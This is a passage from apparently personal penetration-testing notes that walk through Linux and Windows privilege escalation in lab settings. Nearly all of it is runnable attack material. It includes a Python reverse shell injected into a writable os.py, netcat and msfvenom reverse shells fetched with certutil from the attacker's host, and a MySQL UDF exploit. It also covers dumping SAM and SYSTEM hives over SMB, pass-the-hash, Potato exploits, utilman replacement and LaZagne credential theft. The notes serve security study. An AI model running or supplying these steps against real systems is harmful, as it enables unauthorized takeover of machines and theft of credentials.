- /usr/lib/python2.7/lib-dynload
- /usr/local/lib/python2.7/dist-packages
- /usr/lib/python2.7/dist-packages
```
For other distributions, run the command below to get an ordered list of directories:
```
python -c 'import sys; print "\n".join(sys.path)'
```
so we see 1 by 1 all the folder where that library is present
for ex. we found it in 
```
/usr/lib/python2.7$ ls -al
-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
```
we found `os.py` file here
which was being used in the python file as `import os`
we have write permission also on this 
now we edit the python file 
```
/usr/lib/python2.7$ nano os.py
```
in the last of the file , add a reverse shell of python 
we dont need to import os since we are already in os 
remove semicolons also `;` and `import os` and `os.<filename>`
so our revesere shell will become 
```
import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.138",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```
start a reverse listener on kali 
```
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap -cAr nc -lvnp 4444
```
paste it in last of `os.py` file and save and exit
now we wait to get root shell on our kali 

### ==🔵Others : ==

###### ==🔵Kernel Exploits : ==
get the kernel version of machine first
```
uname -a
```
then search on google for ex. `Linux debian 2.6.32-5-amd64 exploit`
or go to exploit db and serach for `linux kernel <version number>`
```
searchsploit -m <exploit full name/path>
```
use only verified exploits and prefer `.c` exploits , not `c++`
now download it to kali and start a python server and transfer the exploit to victim machine
now compile the `.c` code , see the exploit code for the compiling code
```
# gcc exploit.c –o exploit
# g++ exploit.c –o exploit
```
then run : 
```
./<new compiled filename>
```

###### ==🔵Linux Capabilities : ==
```
getcap -r / 2>/dev/null
```
see which all has SUID bit set ex. `cap_setuid+ep`
go to gtfo bins now to see
if `:py` doesn't work , use `:python3`
ex. for `vim` : `./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
for `view` : `./view -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
for ex. if python has it set : `/usr/bin/python2.6 -c "import os; os.setuid(0); os.system('/bin/bash')"

also see if it has `cap_dac_read_search+ep` capability set 
for ex. if `./vim` has it 
you run command `./vim /etc/shadow` to read any file

######  ==🔵Network File System (NFS) : ==
Check the NFS share configuration on the victim machine :
```
cat /etc/exports
```
if it has entry like `/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
which confirms : 
we can see that `/tmp` was exported with `no_root_squash` enabled and `rw` which is read , write the `sync` option shows whatever we will write will be synced on the server immediately as well
and the wildcard `*` tells any hostname can mount this folder
i.e any machine on this network can mount this machine 
alternatively we can use nmap also
```
nmap --script=nfs-showmount <victim ip>
```
it shows victim is exporting `/tmp` folder 
and the wildcard `*` shows anyone on network can mount
now use sudo user always on kali 
we make a new temporary folder in which we will mount 
```
mkdir /tmp/nfs
```
now well mount it 
```
sudo mount -t nfs <victim ip>
# sudo mount -o rw,vers=3 -t nfs <victim ip>:<which folder is mountable> /tmp/nfs
```
now we go to the location we mounted 
```
cd /tmp/nfs
ls -al
```
we are now able to see the server files here
we copy the own bash of the target mahcine into the its own nfs folder first 
```
<victim machine command in the nfs folder>:/tmp$ cp /bin/bash .
```
then we copy it to our `/tmp` on our own kali for a copy
```
┌──(root㉿kali)-[/tmp]
└─# cp /tmp/nfs/bash .
```
then we remove it from the nfs as root from kali
```
┌──(root㉿kali)-[/tmp/nfs]
└─# rm -rf bash
```
then we cd into the nfs as root and copy the version of bash into the nfs 
```
┌──(root㉿kali)-[/tmp]
└─# cd nfs            
┌──(root㉿kali)-[/tmp/nfs]
└─# cp /tmp/bash . 
```
we give it suid and execute permission 
```
┌──(root㉿kali)-[/tmp/nfs]
└─# chmod +xs bash 
```
now we execute it on the victim go get root shell
```
user@debian:/tmp$ ./bash -p
```

######  ==🔵Service Exploits (MySQL) : ==
Identifying the vulnerability : 
check if mysql is running as root : 
```
ps aux | grep mysql | grep root
```
check if you can login without password : 
```
mysql –u root
```
go to exploit db to get exploit and search for `mysql udf`
https://www.exploit-db.com/exploits/1518
download the exploit 
transfer the code form kali to victim machine 
follow the commands mentioned on how to compile 
```
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
execute these commands one by one after logging into mysql : 
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**)
run to gain a shell running with root privileges:
```
/tmp/rootbash -p
```

###### ==🔵read bash (commands and password entered) history : ==
```
cat ~/.*history
# .zsh_history ; python history ; mysql history
```
###### ==🔵ssh keys : ==
```
cd /home/kali/.ssh
/root/.ssh

#if you get it : chmod 600 id_rsa
```
###### ==🔵browser saved passwords : ==
```
git clone https://github.com/alessandroz/lazagne
```
###### ==🔵password files readable/writeable : ==
```
ls -la /etc/passwd
ls -la /etc/shadow

# create a new passowrd hash and paste it there : 
openssl passwd -6 password123 #create a new passowrd hash ; $6$ is sha512
```
# ==🟣Windows Privilege Escalation==

#### ==🔵Methodology : ==

- Quick check C:\ drive for non default folders.
- `tree /F /A .` on C:/Users/ directory, look for suspicious files.
- Quick check Program Files to find non default Software
- Run `whoami /all`, then PrivEscCheck, then PowerUp, then WinPEAS.
- The above will give you all info you need. Save output and slowly go over it.
- If you get completely stuck, you can manually check for things too.
#### ==🔵General : ==

Find Flag 
do manually first : `users > desktop/documents`
```
where /r C:\ local.txt
where /r C:\ proof.txt
```

==🔵if we didn't wanted a call back to our listener using a reverse shell==
==🔵we could have gotten system in same shell as well==
```
PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
# instead of reverse.exe we replaces it with cmd location
```

==🔵To check for our permissions on a file : ==
switch to PowerShell : 
```
powershell
```
run : 
```
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl
```
check for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`
check for `Everyone`
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 
or 
```
icacls .
# "." here is current folder , for a location enter folder location
```

==🔵Admin to System privilege escalation :==
To get a local service shell if you are an admin 
```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```
get `PSExec64.exe` and a reverse shell in same folder
from here check `whoami /priv` or try other methods and escalate to system
Check "Windows UAC Bypass" for Admin Medium to High Integrity privilege escalation

==🔵If in powershell you are unable to execute scripts : ==
```
powershell -executionpolicy bypass
```
###### ==🔵To connect to RDP : ==

BLACK SCREEN : lower mtu to 1000
```
xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
```
or
When it isn't connecting : 
```
xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
```
or 
```
xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
```
Enter the password when prompted.

Transfer `nc.exe` to windows and get a reverse shell : 
Download 64 bit netcat : 
if required then download 32 bit x86 netcat
```
https://github.com/int0x33/nc.exe/
```
start python server : 
```
python3 -m http.server 8000
```
download on windows :
```
powershell iwr http://<kali ip>:8000/nc.exe -o nc.exe
```
to get shell back from windows to kali : 
start a listener on Kali:
```
rlwrap -f . nc -lvnp 4444
```
windows command to get reverse shell of cmd : 
```
nc.exe -e cmd.exe <kali ip> 4444
```

##### ==🔵Basic Manual enumeration : ==
###### User 
to check current user 
```
whoami
```
you need to get till "NT AUTHORITY\SYSTEM" or "Administrator"
to see what all users are present on system 
```
net user
```
to check which group the user belongs to 
```
net user <username>
```
###### Group : 
to see which all groups i am added to and Mandatory Label: 
```
whoami /groups
```
to see what all groups are made 
```
net localgroup
```
to see which all users are present in a particular group : 
```
net localgroup <group name>
```
to see what all users are in the administrators group : 
```
net localgroup administrators
```
###### OS : 
details about system (ex. kernel version , OS name , Hotfix) : 
```
systeminfo
```
Windows hotfixes and security updates installed on the machine : 
```
wmic qfe get *
```
###### Processes : 
so see what all processes are running
```
tasklist
tasklist /v               # for verbose
tasklist /svc             # processes mapped to services
```
###### Network : 
for  IP Address , Gateway :
```
ipconfig /all
```
routing table : 
```
route print
```
to see internally which all ports are open which were not visible from outside : 
```
netstat -ano
```
Firewall settings for the currently active network profile : 
```
netsh advfirewall show currentprofile
```
all Windows Firewall rules configured on the computer :
to check if port forwarding or reverse shells are not working 
```
netsh advfirewall firewall show rule name=all
```
###### Scheduled Tasks : 
```
schtasks /query /fo list /v
or
powershell Get-ScheduledTask
```

to see what all applications are installed : 
```
wmic product get *
wmic product get Caption, Description, InstallLocation, Name
```

Which all files do I have Read/Write permission to :
```
accesschk.exe -accepteula -uws "Users" "C:\Program Files" 2>nul
# for "users" group
```

to check all installed services : 
```
sc query
```

to check which all binaries have auto elevate privileges enabled :
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

to set integrity level of a file : 
```
icacls <file name> /setintegritylevel m
# m = medium 
# h = high
# you cannot set integrity level higher than that of your user
```
#### ==🔵Winpeas (Look for easy wins here first)==
###### If nothing works , then try Winpeas
Download `winPEASx64.exe` : 
```
https://github.com/peass-ng/PEASS-ng/releases/tag/20260922-7b7c14db
```
transfer to windows
run : 
```
.\winPEASx64.exe > windows.txt
```
we'll run winpeas and transfer our file back to kali to analyze more properly

For searching a specific thing in winpeas : 
```
grep -aiA 10 "Looking if you can modify any service registry" windows.txt
grep -aiA 10 "AlwaysInstallElevated" windows.txt
grep -aiA 10 "startup" windows.txt
grep -aiA 10 "putty" windows.txt
```

if found creds in putty , login using ssh

### ==🔵Service Abuse : ==

###### Windows Service Enumeration : 

Displays services and their current states, such as `RUNNING` or `STOPPED`.
```
sc query
```

Lists Windows services, the accounts running them, and their executable paths :
```
wmic service get name, startname, pathname
```
From here look for those services :
1. don't focus on system32 or admin directories
2. which are in program files or tmp or users directory 
3. Look for "LocalSystem"
4. which seems like custom services not default ones
5. which you can modify 
6. Which don't have quoted path (" ")

to get more details about a specific service which you find interesting: 
```
sc qc <service name>
```
see start type , binary path and service start name
we need to check if the binary path is writeable/modifiable
###### ==🔵Automated Tools : ==

SharpUp :
downlaod from : 
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe
transfer to windows 
switch to cmd
```
cmd
```
Run SharpUp
```
.\SharpUp.exe audit
```

accesschk : 
Download from :
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
unzip 
transfer `accesschk.exe` to windows 
run :
```
.\accesschk.exe -cv <servicename> -accepteula
```

PowerUp (PowerShell) :
download from :
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
transfer to windows 
switch to power shell : 
```
powershell
```
Import PowerUp in powershell
```
Import-Module .\PowerUp.ps1
```
Run all checks
```
Invoke-AllChecks
```

----

start python server : 
```
python3 -m http.server 8000
```
download on windows :
```
powershell iwr http://192.168.163.199:8000/accesschk.exe -o accesschk.exe
```

###### ==🔵Method 1 : Change the Service Executable in the path==

Use SharpUp and Look for
=== Modifiable Service Binaries ===

```cmd
wmic service get name, startname, pathname
```
can be quoted path as well here

```
sc qc filepermsvc
```
Look for START_TYPE ,  BINARY_PATH , SERVICE_START_NAME(should be Localsystem)

```
icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 

and well replace the service.exe with our reverse shell
go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server : 
```
python3 -m http.server 8000
```
download on windows directly to path :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```
or 
download normally then replace the service .exe file
```
copy reverse.exe
```
now we need to start the service
If its "demand_start" it wont start automatically 
Restart the service (or wait for reboot if no permissions)
```
net start <service_name>
net stop <service_name>
# sc start
# sc stop
```
well get a reverse shell back 

###### ==🔵Method 2 : Change the Service Executable path==

Use SharpUp and Look for
=== Modifiable Services ===

```
sc qc daclsvc
```
Look for START_TYPE ,  BINARY_PATH , SERVICE_START_NAME(should be Localsystem)

```
icacls "C:\Program Files\DACL Service\daclservice.exe"
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 

we see we have neither of W , M , F in this 
that means we cannot write or modify this 
now well check if we can modify its path

well use accesschk : 
follow steps from there now
look for `RW Everyone : SERVICE_CHANGE_CONFIG`
this permission should be in everyone or you group in which you are in 
that means we can modify the file path 

and well replace the service.exe with our reverse shell
go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server on kali : 
```
python3 -m http.server 8000
```
switch to :temp folder on windows :
```
cd C:\temp
```
download on windows :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```
change bin path 
```
sc config daclsvc binpath= "C:\temp\reverse.exe"
```
verify it again 
```
sc qc daclsvc
```
now start listener and start the service
```
net start daclsvc
```
well get the shell back

###### ==🔵Method 3 : Unquoted Service Paths==

Lists Windows services, the accounts running them, and their executable paths :
```
wmic service get name, startname, pathname
```
From here look for those services :
1. Which don't have quotes (" ")
2. **Contains whitespaces** (e.g., `C:\Program Files\Some Folder\app.exe`)
3. which seems like custom services not default ones
4. don't focus on system32 or admin directories
5. which are in program files or tmp or users directory 
6. Running as **LocalSystem**
No quotes + spaces in path + LocalSystem = **exploitable**

automated way : (do manual also)
well use PowerUp (PowerShell) for that
go to automated tools for that
You can also use the targeted function:
```powershell
Get-ServiceUnquoted
```
now look for `[*] Checking for unquoted service paths...`

now for ex. if we get `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
we have to check recursively from the starting of folder path till ending to see if we have write access to the folder or not
till we get we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this folder contents ex. "BUILTIN\Users:(F)"
```
icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Unquoted Path Service"
icacls "C:\Program Files\Unquoted Path Service\Common Files"
```
after the get the folder where we have writeable permissions for : 
ex. so in this the search order will be for system as 
```
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe 
```
make a reverse shell with the name of "FOLDER NAME FIRST WORD.exe"
transfer to windows 
and paste in this path

go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f exe -o Common.exe
```
enter our kali ip and port
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
transfer to windows on the same `service.exe` file location
start python server on kali : 
```
python3 -m http.server 8000
```
download on windows :
If you want to download directly to a path :
```
certutil -f -urlcache http://192.168.163.199:8000/Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
start the service
```
net start unquotedsvc
```
well get the shell back
###### ==🔵Method 4 : DLL Hijacking ==

SAME AS UNQUOTED SERVICE PATHS CONCEPT

PowerUp (PowerShell) :
download from :
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
transfer to windows 
switch to power shell : 
```
powershell
```
Import PowerUp in powershell
```
Import-Module .\PowerUp.ps1
```
Run all checks
```
Invoke-AllChecks
```
Look for `Checking %PATH%" for potentially hijackable DLL locations`

Enumeration 1 : 
ProcMon :
```
▹ Add Filter: Process Name = yourapp.exe (process name , is , <filename>.exe , include , add , apply)
▹ Add Filter: Result = NAME NOT FOUND
```

and serach for `dllsvc` 
```
sc qc dllsvc
```
now we start the service manually again : 
```
sc start dllsvc
```
observe on procmon 
we see some entries it is creating some files 
we see how much access we have on this folder which it is using
```
icacls "C:\Program Files\DLL Hijack Service"
```
again well check other folder , check all 
acc to the path
```
echo %PATH%
```
now well make a malicious dll using msfvenom 
make the output file of the same name 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f dll -o hijackme.dll
```
now well transfer to windows now 
start python server on kali : 
```
python3 -m http.server 8000
```
download on windows :
If you want to download directly to a path :
```
certutil -f -urlcache http://192.168.163.199:8000/hijackme.dll "C:\temp\hijackme.dll"
```
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
stop service 
```
sc stop dllsvc
```
then start 
```
sc start dllsvc
```
we get a reverse shell back : 

OPTION 2 : 

Enumeration 2 :
Check permissions to unprivileged paths
```
▹ icacls <directory>
▹ accesschk.exe -accepteula -dqv <directory>
```

Exploit :
Create a payload 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali ip> LPORT=4444 -f dll -o hijackme.dll
```
Place the DLL in the writable path
```
copy reverse.dll <writable_dll_path>
```
Restart the service (or wait for reboot if no permissions)
```
sc start <service_name>
sc stop <service_name>
```

### ==🔵Sensitive Credentials==

###### ==🔵Unattended Windows Installations==

first come to C:\ folder 
```
cd C:\
```
search all files in C:\
```
dir /s /b | findstr /i "unattend.xml"
```
then view each file by 
```
type "full path of file"
```
###### ==🔵Powershell History==

CMD : 
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

PowerShell : 
```
cat (Get-PSReadlineOption).HistorySavePath
```
###### ==🔵Saved Windows Credentials==

```shell-session
cmdkey /list
```
do to see which all groups have which all users
```
net user
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option
```shell-session
runas /savecred /user:<found username here> cmd.exe
runas /savecred /user:admin cmd.exe
```
###### ==🔵IIS Configuration==

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
find 
```
<add connectionString
```
in last 
###### ==🔵Retrieve Credentials from Software: PuTTY==

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

It might be that the user same password for system as well so try it also
###### ==🔵Browser saved passwords : ==

download `Lazagne.exe `from : 
```
https://github.com/AlessandroZ/LaZagne/releases/tag/v2.4.7
```
transfer to windows 
```
.\LaZagne.exe all
.\laZagne.exe browsers
.\laZagne.exe browsers -firefox
```
###### ==🔵Passwords - Security Account Manager (SAM)==

The standard locations are:
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
```

If for ex. system has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory

we go to the directory
```
cd C:\Windows\Repair
C:\Windows\Repair>dir
```
Transfer the SAM and SYSTEM files to your Kali VM using SMB 
On Kali start SMB server : 
```
impacket-smbserver share .
```
On windows transfer files : 
```
copy <input file name> \\<kali ip>\share\<output file name>

# copy SAM \\192.168.163.199\share\SAM
# copy SYSTEM \\192.168.163.199\share\SYSTEM
```
now well use secrets dump by impacket 
```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

==🔵Method 1 : Pass the Hash (Preferred)==
now well do pass the hash using psexec to gain admin 
since we got admin hash
**Hash format:** `uid:rid:lmhash:nthash` — the **last hash** (after the second `:`) is the **NTLM hash** you want.
```
impacket-psexec Administrator@<windows target ip> -hashes :<password hash>
```
 Spacing is strict. The format is `-hashes :<NTLM_HASH>` (colon before the hash, no LM hash).
for some user it might work for some users it might now
```
impacket-psexec admin@10.49.149.124 -hashes :a9fdfa038c4b75ebc76dc855dd74f0da
```
well get a shell of admin

==🔵Method 2 : Password cracking ==
john will automatically identify the hashing algorithm
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
```
You can use the cracked password to log in as the admin using winexe or RDP.
### ==🔵Registry Attacks==

Windows Registry = A shared database where Windows stores configuration settings.
###### ==🔵Autorun==

Enumeration : 
Check Run or RunOnce keys :
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

Check write access to the exe for current user:
check for both the paths locations 
```
icacls <directory/file>
accesschk.exe -accepteula -wuqv [file]
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 

paste reverse shell (.exe) to that location to replace the program that is starting in Autorun
Start a listener on Kali

Wait for the administrator to log on
restart the Windows VM.
Open up a new RDP session (with username as admin) to trigger a reverse shell running with admin privileges.

###### ==🔵Weak Registry Permissions (changing path of executable in registry)==

Use Winpeas 
grep only that section from winpeas output 
```
grep -aiA 5 "Looking if you can modify any service registry" windows.txt
```

now we get details about this service in registry for full `ImagePath`
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
```

we check for our permissions on the path :
switch to PowerShell
```
Get-Acl -Path "HKLM\System\CurrentControlSet\services\regsvc" | fl
```
Look for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`

now we make a reverse shell 
switch to :temp folder on windows :
```
cd C:\temp
```
download on windows :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```

now we modify the original registry path so that the service loads our reverse shell
```
reg add HKLM\System\CurrentControlSet\services\regsvc /v ImagePath /d "C:\temp\reverse.exe" /f
```

now we check if we start this service oursef or not 
```
sc qc regsvc
```
also check `BINARY_PATH_NAME` here to see if path changed or not
if it says `START_TYPE : DEMAND_START` , we can start it manually

start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```

we start the service now 
```
sc start regsvc
```
we get a shell back 

###### ==🔵AlwaysInstallElevated==

Enumerate : 
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
For BOTH Registry keys : 
`AlwaysInstallElevated` must be set to `1` (`0x1`) 
`DisableMSI`  should be set  to `0` (`0x0`)  i.e False so we can execute our `.msi`

now well make a reverse shell of `.msi`
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f msi > reverse.msi
```
enter our kali ip and port
start python server on kali : 
```
python3 -m http.server 8000
```
download on windows :
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.msi reverse.msi
```
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
run the msi
```
.\reverse.msi
# msiexec /quiet /qn /i C:\PrivEsc\reverse.msi ; if 1st one doesnt work
```
well get a reverse shell back 
### ==🔵Privilege Attacks==

###### ==🔵to check current privileges==
```
whoami /priv
whoami /all
```
`State` of the Privilege should be `Enabled`

check `systeminfo` to know architecture first 32 bit or 64 bit
```
systeminfo
```
###### ==🔵if SeImpersonatePrivilege : Disabled : ==
Full powers : 
```
https://github.com/itm4n/FullPowers
```
download : `FullPowers.exe`
run : 
```
.\FullPowers.exe
```

#### ==🔵SeImpersonate/SeAssignPrimaryToken Privilege==

###### ==🔵GodPotato : ==
```
https://github.com/BeichenDream/GodPotato
```
download the net4 version (try all versions if one does not work)
upload a reverse shell also to same folder as God Potato
Then from the Windows LOCAL SERVICE shell:
```
.\GodPotato-NET4.exe -cmd reverse.exe
```
start listener 
well get rev shell back
###### ==🔵Juicy Potato : ==
Windows 7, Windows 10/Server 2016 1803
If its Windows 7 / Server 2008 R2 - x86 / 32-bit
search on google for - "juicy potato 32 bit github"
download : `Juicy.Potato.x86.exe` , rename if necessary
```
https://github.com/ivanitlearning/Juicy-Potato-x86/releases
```
transfer to windows : 
```
python3 -m http.server 8000
```
Windows get file : 
```
certutil -f -urlcache http://10.10.14.138:8000/JuicyPotato.exe JuicyPotato.exe
```
now we make a reverse shell 
For 32 bit x86 architecture : 
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
```
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
start python server on kali : 
```
python3 -m http.server 8000
```
transfer to windows
```
certutil -f -urlcache http://10.10.14.138:8000/reverse.exe reverse.exe
```

now run the juicy potato 
```
.\JuicyPotato.exe -t * -p "C:\Users\Public\reverse.exe" -l 4444 -c {6d18ad12-bde3-4393-b311-099c346e6df9}
```
we get reverse shell back 
if the exploit is not working , change CLSID as per version of windows for the exploit to work 
```
https://github.com/ohpe/juicy-potato/tree/master/CLSID
```
###### ==🔵RoguePotato : ==
Windows Server 2019 1809 -
download `RoguePotato.zip` from 
```
https://github.com/antonioCoco/RoguePotato
https://github.com/antonioCoco/RoguePotato/releases/tag/1.0
```
we not transfer it to windows 
start python server
```bash
python3 -m http.server 8000
```
on windows , get file from kali : 
```cmd
powershell iwr http://192.168.163.199:8000/RoguePotato.exe -o RoguePotato.exe
```
Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim windows IP>:9999
```
run it it wont give any output
now well transfer a reverse shell also to same folder of rogue potato 
star listener on kali
```
rlwrap -f . nc -lvnp 4444
```
on windows run rogue potato 
```
RoguePotato.exe -r <kali ip> -e reverse.exe -l 9999
```
we get a rev shell back 
###### ==🔵PrintSpoofer==
Windows 10/Server 2016 1607, Server 2019

download from 
```
https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
```
download PrintSpoofer32.exe or PrintSpoofer64.exe
If error : try for both print spoofer 32 bit and 64 bit according to your need
transfer to windows
start python server
```bash
python3 -m http.server 8000
```
on windows , get file from kali : 
```cmd
powershell iwr http://192.168.163.199:8000/PrintSpoofer64.exe -o PrintSpoofer64.exe
```
on windows , get reverse shell also from kali : 
```cmd
powershell iwr http://192.168.163.199:8000/reverse.exe -o reverse.exe
```
start listener on kali : 
```bash
rlwrap -f . nc -lvnp 4444
```
run print spoofer 
```
PrintSpoofer64.exe -c reverse.exe -i
```
we get rev shell back 
if we didn't wanted a call back to our listener using a reverse shell
we could have gotten system in same shell as well
```
PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
```
#### ==🔵SeTakeOwnership==

we take ownership of utilman
```
takeown /f C:\Windows\System32\utilman.exe
```
confirm check who is the owner : 
```
powershell (Get-Acl "C:\windows\system32\utilman.exe").Owner
```
now give access of utilman to our user
```
icacls C:\Windows\System32\Utilman.exe /grant <username>:F
```
we saw from owner command , our username , so 
```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

now we make a reverse shell and transfer it to windows 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
start python server on kali : 
```
python3 -m http.server 8000
```
start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```
if you want in current directory : 
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```

now well replace our reverse shell with the utilman 
```
copy reverse.exe C:\windows\system32\utilman.exe
```
overwrite : yes

now we trigger utilman
from start windows menu > user round icon > lock 
now click on ease of access button 
after clicking we will get reverse shell back
#### ==🔵SeBackup/SeRestore Privilege==

we take out SAM and SYSTEM from registry directly
and then well save it locally in our documents
```
reg save hklm\sam sam
reg save hklm\system system
```
now well transfer these back to our kali 

On Kali start SMB server : 
```
impacket-smbserver share . -smb2support
```
On windows transfer files : 
```
copy sam \\10.10.14.138\share\sam
copy system \\10.10.14.138\share\system

# ex. copy windows.txt \\192.168.131.128\share\windows.txt
```

now we dump these files
```
impacket-secretsdump -sam sam -system system LOCAL
```
we get admin hash
```
Format: RID : LM hash : NT hash
```

### ==🔵Other Windows Components==

#### ==🔵Kernel Exploitation ==

check `systeminfo`
```
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
look for `OS Name` , `OS Version` , `Hotfix(s)` , `System Type`

Find matching exploits
```
▹ searchsploit windows kernel <build number> <OSversion>
▹ ExploitDB
▹ GitHub
```

now to compile there are 2 different ocmmanads
gcc - when code is in C 
g++ when code is in C++
if i want to compile for 64 bit :
```
x86_64-w64-mingw32-gcc exploit.c –o exploit.exe
```
if i want to compile for 32 bit :
```
i686-w64-mingw32-gcc exploit.c –o exploit.exe
```

----

Alternative with Metasploit : 

First establish a reverse shell in Metasploit : 
Both the reverse shell you are creating and the payload you are setting in multi handler should be same value
create reverse shell For Metasploit Meterpreter handler : 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
```
transfer to windows 
now back on kali start listener 
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.14.174 [Kali VM IP Address] 
set lport 4444
run
```
now run our reverse shell on windows : 
```
reverse.exe
```

Exploitation  : 
Kali VM : 
now we will background this shell session and use our payload 
```
background
use post/multi/recon/local_exploit_suggester
set session 1
show options
run
```

it has now identified a lot of potential cves for the kernel version : 
green ones are vulnerable , red ones are not
